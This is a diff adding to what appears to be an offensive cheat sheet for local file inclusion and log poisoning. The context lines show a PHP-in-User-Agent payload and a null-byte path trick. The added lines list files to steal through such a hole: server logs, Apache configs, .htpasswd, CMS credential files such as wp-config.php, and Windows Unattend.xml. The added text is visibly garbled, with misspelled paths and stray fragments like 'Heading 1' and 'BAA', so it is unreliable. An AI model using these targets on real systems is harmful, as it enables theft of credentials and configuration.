@@ -422,6 +422,23 @@ User-Agent: <?=phpinfo(); ?>
 ```
 >next log
 ```
+/etc/php/x.x/cli/php.ini
+/var/log/tittpd/access log
+/var/log/apache/error.log /var/log/apache2/error.log
+/var/log/httpd/error log
+/var/log/messages
+/var/log/cron.log
+/var/log/secure
+/var/log/auth.log
+/etc/apache2/sites-enabled/000-default.conf
+/etc/apache2/sites-enabled/domain.conf
+/etc/apache2/sites-enabled/example.com.coof /etc/apache2/sites-enabled/sub.example.com.conf
+/etc/apache2/sites-enabled/sub.conf
+/etc/apache2/sites-available/domain.conf
+/etc/apache2/sites-available/example.com.conf
+/etc/apache2/sites-available/sub.example.com.conf
+/etc/apache2/sites-available/sub.conf
+/etc/apache2/.htpasswd
 /etc/httpd/conf/httpd.conf%00
 /var/log/apache/access.log
 /var/log/apache/error.log
@@ -437,6 +454,50 @@ User-Agent: <?=phpinfo(); ?>
 /usr/local/apache2/log/error_log
 
 ```
+>next
+```
+WordPress: /var/www/html/wp-config.php
+
+Heading 1
+
+م
+
+BAA
+
+Joomla: /var/www/configuration.php
+
+Dolphin CMS: /var/www/html/inc/header.inc.php
+
+Drupal:/var/www/html/sites/default/settings.php
+
+Mambo: /yar/www/configuration.php
+
+PHPNuke: /var/www/config.php
+
+PHPbb:/var/www/config.php
+
+WINDOWS
+
+C:/Windows/System32/drivers/etc/hosts I
+
+C:/Windows/Panther/Unattend/Unattended.xml
+
+C:/Windows/Panther/Unattended.xml
+
+C:/Windows/Panther/Unattend.txt
+
+C:/Unattend.xml
+
+C:/Autounattend.xml
+
+C:/Windows/system32/sysprep
+
+C:/Inetpub/wwwroot/
+
+C:/Inetpub/wwwroot/web.config
+
+```
+
 >next way
 ```
 
